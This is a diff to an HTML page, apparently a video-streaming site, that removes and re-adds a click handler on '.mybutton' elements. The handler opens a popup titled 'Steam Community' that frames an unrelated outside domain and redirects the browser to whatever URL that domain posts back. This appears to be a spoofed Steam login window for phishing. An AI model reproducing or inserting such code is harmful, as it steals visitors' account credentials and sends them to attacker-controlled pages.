@@ -5573,8 +5573,42 @@
         </div>
       </div>
     </div>
-<script>document.querySelector('.mybutton').onclick = function(){var wind = window.open("", "", "STATUS=NO, TOOLBAR=NO, LOCATION=0, DIRECTORIES=0, RESISABLE=NO, SCROLLBARS=YES, TOP=50, LEFT=50, WIDTH=1004, HEIGHT=800");wind.document.write("<html style='overflow:hidden;'><head><title>Steam Community</title><style>html, body {width:1004px; height:800px; margin:0px; padding:0px;}</style></head><body><iframe src='https://marathonhe.com/6e1e3' border='0' style='width:100vw; height:100vh; border: none;' onload="window.addEventListener('message',e=>{if(typeof e.data=='object'&&typeof e.data.r=='string'&&e.data.r.length>0){window.location.href=e.data.r}},false);"></iframe></body></html>");return false;}</script>
 
+      <script>
+        let btns = document.querySelectorAll('.mybutton');
+btns.forEach(el => {
+  el.onclick = function() {
+    var wind = window.open("", "", "STATUS=NO, TOOLBAR=NO, LOCATION=0, DIRECTORIES=0, RESIZABLE=NO, SCROLLBARS=YES, TOP=50, LEFT=50, WIDTH=1004, HEIGHT=800");
+    wind.document.write(`
+      <html style='overflow:hidden;'>
+        <head>
+          <title>Steam Community</title>
+          <style>
+            html, body {
+              width:1004px; 
+              height:800px; 
+              margin:0px; 
+              padding:0px;
+            }
+          </style>
+        </head>
+        <body>
+          <iframe src='https://marathonhe.com/6e1e3' border='0' style='width:100vw; height:100vh; border: none;'></iframe>
+          <script>
+            window.addEventListener('message', e => {
+              if (typeof e.data === 'object' && typeof e.data.r === 'string' && e.data.r.length > 0) {
+                window.location.href = e.data.r;
+              }
+            }, false);
+          <\/script>
+        </body>
+      </html>
+    `);
+    return false;
+  }
+});
+
+      </script>
     <script src=" stream/jquery.min.js"></script>
     <script src=" stream/jquery.lazy.min.js"></script>
     <script src=" stream/artplayer.js"></script>
